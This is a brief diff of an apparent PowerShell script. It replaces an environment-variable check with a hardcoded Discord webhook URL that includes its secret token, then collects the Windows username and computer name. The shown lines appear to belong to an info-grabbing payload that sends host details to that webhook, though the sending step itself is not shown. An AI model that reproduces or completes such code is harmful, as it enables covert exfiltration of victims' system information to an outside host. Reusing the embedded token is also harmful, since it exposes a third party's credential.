@@ -1,8 +1,4 @@
-if (-not $HOOKZILLA_URL) {
-    Write-Error "Missing webhook URL in HOOKZILLA_URL variable"
-    exit
-}
-$webhookUrl = $HOOKZILLA_URL
+$webhookUrl = https://discordapp.com/api/webhooks/1360981550174441498/cxv3RG3NDt_eRobBKo7STK3C-mmx76IS5T8QJ07qZnspV749ZRZ0uLVRGBzzsq_2Rh3v
 
 $username = $env:USERNAME
 $computername = $env:COMPUTERNAME
